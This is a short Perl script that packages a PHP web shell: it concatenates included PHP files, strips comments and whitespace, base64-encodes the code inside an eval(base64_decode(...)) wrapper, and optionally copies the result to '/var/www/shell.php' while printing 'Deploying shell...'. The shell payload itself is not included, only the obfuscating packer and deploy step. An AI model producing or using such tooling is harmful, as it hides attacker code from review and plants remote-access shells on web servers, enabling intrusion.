#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Long;
use MIME::Base64 qw(encode_base64);

my %config = (
	build	=> 1,
	deploy  => 0,

	target	=> '/var/www/shell.php',
	output 	=> 'output.php',
	file	=> 'index.php',
	join 	=> 1,
	compress 	=> 0,
	minify		=> 1,
	encode 		=> 1,
    include_path => '.',
);

GetOptions(
	'build=i'	=> \$config{build},
	'deploy=i'	=> \$config{deploy},
    'target=s'  => \$config{target},
	'output=s'	=> \$config{output},
	'file=s'	=> \$config{file},
	'join=i'	=> \$config{join},
	'compress=i'=> \$config{compress},
	'minify=i'	=> \$config{minify},
	'encode=i'	=> \$config{encode},
    'include_path=s' => \$config{include_path},
);

my $regex = 'include \"(.*)\"\;';
my $replace = 'include ".*";';
my $buffer;

if ($config{build}) {
	$buffer = `cat "$config{file}"`;
	if ($config{join}) {
		my @files = $buffer =~ m/$regex/g;
		$buffer =~ s/$replace//g;

		print "Joinin @files...\n";
		foreach (reverse @files) {
			$buffer = `cat $config{include_path}/$_` . $buffer;
		}

		$buffer =~ s/\<\?php//g;
	}

	if ($config{minify}) {
		$buffer =~ s/\/\/.*\n//g;
		$buffer =~ s/\#.*\n//g;
		$buffer =~ s/\n//g;
		$buffer =~ s/\t//g;
	}
	if ($config{encode}) {
		$buffer = "base64_decode('" . encode_base64($buffer, "") . "')";
		$buffer = "<?php eval($buffer);";
	}else{
		$buffer = "<?php $buffer";
	}

	open FILE, ">$config{output}" || die $!;
	print FILE $buffer;
}
if ($config{deploy}){
	print "Deploying shell...";
	`cp $config{output} $config{target}`;
}
